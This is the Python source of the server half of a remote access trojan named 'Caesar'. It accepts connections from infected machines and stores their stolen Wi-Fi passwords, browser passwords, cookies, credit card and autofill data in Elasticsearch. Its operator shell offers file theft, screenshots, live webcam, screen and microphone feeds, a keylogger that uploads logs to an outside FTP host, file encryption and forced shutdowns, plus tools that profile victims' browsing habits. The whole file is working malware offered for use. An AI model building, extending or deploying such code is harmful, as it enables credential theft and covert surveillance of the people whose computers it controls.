import os
import re
import json
import time
import struct
import socket
import threading
from queue import Queue
from datetime import datetime
from es_handler import EsHandler
from data_analyzer import Analyzer
from client_handler import ClientHandler
from getmac import get_mac_address as gma





class Caesar:

        def __init__(self, host, port, db_name, es_url, client_folder_name):
            self.host = host
            self.port = port
            self.sock = None
            self.queue = Queue()
            self.socket_object_dict = {}
            self.current_session_id = str()
            self.analyzer = Analyzer(db_name)
            self.clientHandler = ClientHandler()
            self.clientFolder = client_folder_name
            self.esHandler = EsHandler(db_name, es_url)

            ##################################FTP SERVER CREDENTIALS#############################
            self.FTP_USER = ""
            self.FTP_PASS = ""
            self.LOG_FILE = "log.txt"
            self.FTP_HOST = "files.000webhost.com"
            ##################################FTP SERVER CREDENTIALS#############################



        # create socket and listen for connections
        def create_socket(self):
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.bind((self.host, self.port))
                self.sock.listen(20) #listen for connection
            except socket.error as err:
                print(f"[-]Error unable to create socket {str(err)}")


        # handles incoming connections
        def handle_connections(self):
            while True:

                try:
                    conn, addr = self.sock.accept()
                    conn.setblocking(True)
                    client_info = conn.recv(1024).decode()# recieves client system information
                    ip = re.findall("'(.*?)'", str(addr))# extract ip from addr
                    ip = "".join(ip)

                    # check if connected client already exists in ES index
                    if (self.esHandler.is_conn_present(str(json.loads(client_info)['mac-address']))):
                        client_id = self.esHandler.update_document(str(json.loads(client_info)['mac-address']), ip, client_info)
                        self.socket_object_dict.update({client_id:conn})

                        path = os.path.join(self.clientFolder, str(client_id))
                        if not os.path.exists(path):
                            os.mkdir(path)

                        print(f"\n[+]Node {ip} has reconnected on port {self.port}!")
                        self.store_harvested_data(conn, client_id)


                    # create a new ES document if the client does not exist
                    else:
                        client_conn_dict = self.esHandler.store_client_information(ip, conn, client_info)
                        client_id = next(iter(client_conn_dict))

                        path = os.path.join(self.clientFolder, str(client_id))
                        if not os.path.exists(path):
                            os.mkdir(path) # create a folder for new client using their ES client ID

                        self.socket_object_dict.update(client_conn_dict)
                        print(f"\n[+]Node {ip} has connected!")
                        self.store_harvested_data(conn, client_id)

                except Exception as e:
                    print(e)
                    # print("[-]Something went wrong connecting to client!!!")
                    break



        # displays caesar shell commands
        def show_commands(self):
            user_guide = """
                Caesar Commands
                     'guide': [Display Caesar's user commands]
                     'clients':[lists clients within ES index]
                     'connected':[lists all active connection within ES index]
                     'shell (target ES Client_ID)':[selects a target and creates a session between the server and the client machine]
                     'delete (target ES Client_ID)': [remove specified document from index]
                     'delete all': [remove all document from index]
                     'get (target ES Client_ID)': [retrieves indexed data of specified target]
                     'show fields (target ES Client_ID)': [displays existing field for specified target]
                     'field (target ES Client_ID) (FIELD NAME):  [displays specified field]

                Client Commands
                    'guide': [Display Caesar's user commands]                                                
                    'quit':[quits the session and takes user back to Caesar ES interface]           
                    'get (filename or path)':[Receieve specified file from target client]
                    'send (filename or absolute path)':[send specified file to the target client]      
                    'screenshot':[takes a screen shot of the client machine]
                    'camshot':[captures an image from the client's webcam]  
                    'camfeed': [live feed from target's webcam]
                    'screenfeed': [live feed from target's screen]
                    'audiofeed': [live audio feed from target's microphone]
                    'encrypt (PASSWORD) (FILENAME)': [encrypts specified file]            
                    'decrypt (PASSWORD)(FILENAME)': [decrypts specified file]   
                    'ftp download (FILENAME)' : [download specified file from FTP server]
                    'ftp upload (FILE PATH)' : [uploads specified file to FTP server]      
                    'start keylogger' : [starts Keylogger]
                    'stop keylogger' : [stops Keylogger]
                    'keylogger status' : [provides updatae on keylogger status]
                    'reboot' : [reboot client system]
                    'shutdown' : [shutdown client system]

                Analyzer Commands
                    'resolve history (target ES Client_ID)' : [cleans browsing history data and adds youtube channel name to excisting data]
                    'browser summary (target ES Client_ID)' : [displays summary of browser data]
                    'most active times (target ES Client_ID)': [displays target's active browsing times in descending order]
                    'average active times (target ES Client_ID)' [displays target's average browsing times]
                    'rank channels (target ES Client_ID) count': [displays target's most watched youtube channels in descending order]
                    'rank websites (target ES Client_ID) count': [displays target's most visited website in descending order]
                    'web titles (target ES Client_ID) (domain_name)': [display website titles for specified domain name]
                    'video titles (target ES Client_ID) (channel_name)': [display video titles for specified youtube channel]
                    'user activity (target ES Client_ID)': [ranks most used applications in descending order]
            """
            print(user_guide)



        # format text to bold and blue 
        def convert_caesar_text(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"


        # returns socket connection object 
        def get_socket_obj(self, client_id):
            try:
                for clients, socket_obj in self.socket_object_dict.items():
                    if clients == client_id:
                        return socket_obj
                        break
            except:
                print("[-]ID does not exists!!! ")



        # sends null to the client and get the current working directory in return
        def send_null(self, client_sock_object):
            client_sock_object.send(str(" ").encode())
            data = client_sock_object.recv(1024).decode()
            print(str(data), end="")



        #saves harvested system info from client in Elastic Search Index
        def store_harvested_data(self, client_sock_object, client_id):
            data_types = [
                ("installed-apps", "Installed App Data"),
                ("startup-app-data", "Startup App Data"),
                ("wifi-credentials", "Wi-Fi Password Credentials"),
                ("browser-passwords", "Browser Password Data"),
                ("browser-cookie", "Browser Cookie Data"),
                ("browser-history", "Browser History Data"),
                ("credit-card-info", "Credit Card Data"),
                ("autofill-data", "Autofill Data"),
                ("memory-info", "Memory Info Data"),
                ("disk-info", "Disk Info Data"),
                ("network-info", "Network Info Data"),
                ("user-activity-data", "User Activity Data"),
                ("other-data", "Other Data")
            ]

            try:
                for index, (data_key, data_description) in enumerate(data_types, start=1):
                    data = self.recv_msg(client_sock_object)
                    data = json.loads(data.decode())
                    self.esHandler.append_information(data_key, data, client_id)
                    print(f"[+]{data_description} extraction completed ({index}/{len(data_types)})")
                print("[+] Data extraction completed!")

            except Exception as e:
                print("[-]Error occurred while collecting data!!!")
                print(e)




        def recv_msg(self, sock):
            # Read message length and unpack it into an integer
            raw_msglen = self.recvall(sock, 4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('>I', raw_msglen)[0]
            # Read the message data
            return self.recvall(sock, msglen)



        def recvall(self, sock, n):
            # Helper function to recv n bytes or return None if EOF is hit
            data = bytearray()
            while len(data) < n:
                packet = sock.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            return data



        # sends commands to the client
        def handle_client_session(self, client_id, client_sock_object):
            self.send_null(client_sock_object)
            self.current_session_id = client_id

            while True:
                try:
                    cmd = ""
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd.strip() == 'quit':
                        print("[+]Closing Session!!!!....")
                        self.current_session_id = ""
                        break

                    elif cmd == "":
                        self.send_null(client_sock_object)

                    elif cmd == "guide":
                        self.show_commands()
                        self.send_null(client_sock_object)

                    elif cmd.startswith("get "):
                        client_sock_object.send(str(cmd).encode())
                        usrFile = cmd.split()[-1]
                        data = client_sock_object.recv(1024).decode()
                        if "File does not exist!!!" not in data:
                            self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
                            print(str(data), end="")
                        else:
                            print(data)

                    elif cmd.startswith("send "):
                        filepath = str(cmd.split()[-1])

                        if os.path.isabs(filepath):
                            client_sock_object.send(str(cmd).encode())
                            self.clientHandler.send_file(client_sock_object, filepath)
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        else:
                            print("[-]You must provide an absolue path for the file you want to send!")
                            self.send_null(client_sock_object)

                    elif cmd.strip() == "camshot":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                        print(str(data), end="")

                    elif cmd.strip() == "camfeed":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        self.clientHandler.live_webcam_feed(client_sock_object)
                        print(str(data), end="")
                          
                    elif cmd.strip() == "screenshot":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                        print(str(data), end="")

                    elif cmd.strip() == "screenfeed":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        self.clientHandler.live_screen_feed(client_sock_object)
                        print(str(data), end="")

                    elif cmd.strip() == "audiofeed":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
                        print(str(data), end="")

                    elif cmd.startswith("encrypt "):
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd.startswith("decrypt "):
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd.startswith("ftp download "):
                        cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd.startswith("ftp upload"):
                        cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd == "start keylogger":
                        cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd == "stop keylogger":
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd == "keylogger status":
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd.strip() == "reboot":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    elif cmd.strip() == "shutdown":
                        cmd = cmd.strip()
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(1024).decode()
                        print(str(data), end="")

                    else:
                        client_sock_object.send(str(cmd).encode())
                        data = client_sock_object.recv(65536).decode()
                        print(str(data), end="")

                except Exception as e:
                    print(e)
                    print("[-]Connection terminated!!!")
                    break



        # shell interface
        def shell_interface(self):
            while True:
                print(self.convert_caesar_text("Caesar: "), end="")
                cmd = input()
                cmd = cmd.rstrip()

                if cmd == '':
                    pass
                elif cmd.strip() == 'clients':
                    self.esHandler.retrieve_client_information()

                elif cmd.startswith('show fields '):

                    cmd = cmd.split()
                    if len(cmd) == 3:
                        client_id = cmd[2]
                        self.esHandler.show_fields(client_id)
                    else:
                        print("[-]Invalid use of the show field command")            

                elif cmd.strip() == 'guide':
                    self.show_commands()

                elif 'get' in cmd:
                    client_id = cmd[4:]
                    self.esHandler.retrieve_client_document(client_id)

                
                elif cmd.startswith('delete all '):
                    self.esHandler.delete_all_docs()
                    self.socket_object_dict.clear()

                elif cmd.startswith('delete '):
                    client_id = cmd[7:]
                    self.esHandler.delete_client_document(client_id)
                    if(client_id in self.socket_object_dict):
                        self.socket_object_dict.pop(client_id)


                elif 'field' in cmd:
                    cmd = cmd.split()
                    if len(cmd) == 3:          
                        client_id = cmd[1]
                        parameter = cmd[2]
                        self.esHandler.get_field(client_id, parameter)
                    else:
                        print("[-]Invalid use of the field command")


                elif cmd.strip() == 'connected':
                    self.esHandler.get_connected_client(self.socket_object_dict)

                elif cmd.startswith('shell '):
                    client_id = cmd[6:]
                    current_session_id = client_id
                    client_sock_object = self.get_socket_obj(client_id)

                    # check if connection is still active
                    if(self.socket_object_dict):
                        try:
                            client_sock_object.send("conn check".encode())
                            self.handle_client_session(client_id, client_sock_object)
                        except Exception as e:
                            print("[-]Client connection is not active!")
                    else:
                        print("[-]No connection is active!")


                elif cmd.startswith('browser summary '):
                        cmd = cmd.split()
                        if len(cmd) == 3: 
                            client_id = cmd[2]
                            self.analyzer.browser_history_summary(client_id)
                        else:
                            print("[-]Invalid use of the field command")

                elif cmd.startswith('resolve history '):
                    cmd = cmd.split()
                    client_id = cmd[2]
                    self.analyzer.yt_resolver(cmd[2])

                elif cmd.startswith('most active times '):
                    cmd = cmd.split()
                    if len(cmd) == 4:
                        self.analyzer.most_active_times(cmd[3])
                    else:
                        print("[-]Invalid command!!!")


                elif cmd.startswith('average active times '):
                    cmd = cmd.split()
                    if len(cmd) == 4:
                        self.analyzer.average_browsing_hours(cmd[3])
                    else:
                        print("[-]Invalid command!!!")


                elif cmd.startswith('web titles '):
                    cmd = cmd.split()
                    if len(cmd) == 4:
                        self.analyzer.get_web_titles(cmd[2], cmd[3])
                    else:
                        print("[-]Invalid command!!!")


                elif cmd.startswith('video titles '):
                    cmd = cmd.split() 
                    channel_name = ' '.join(cmd[3:])
                    self.analyzer.get_video_titles(cmd[2], channel_name)
                    

                elif cmd.startswith('rank channels '):
                    cmd = cmd.split()
                    if len(cmd) == 4:
                        self.analyzer.rank_youtube_channels(cmd[2], int(cmd[3]))
                    else:
                        print("[-]Invalid command!!!")


                elif cmd.startswith('rank websites '):
                    cmd = cmd.split()
                    if len(cmd) == 4:
                        self.analyzer.most_visited_websites(cmd[2], int(cmd[3]))
                    else:
                        print("[-]Invalid command!!!")


                elif cmd.startswith('user activity '):
                    cmd = cmd.split()
                    if len(cmd) == 3:
                        self.analyzer.get_windows_activity_history(cmd[2])
                    else:
                        print("[-]Invalid command!!!")

                else:
                    print("[-]Invalid command!")


        
        def thread_handler(self):
            for task_number in [1, 2]:
                thread = threading.Thread(target=self.handle_connections if task_number == 1 else self.shell_interface)
                if task_number == 1:
                    thread.daemon = True
                thread.start()



        def start(self):
            self.create_socket()
            self.thread_handler()

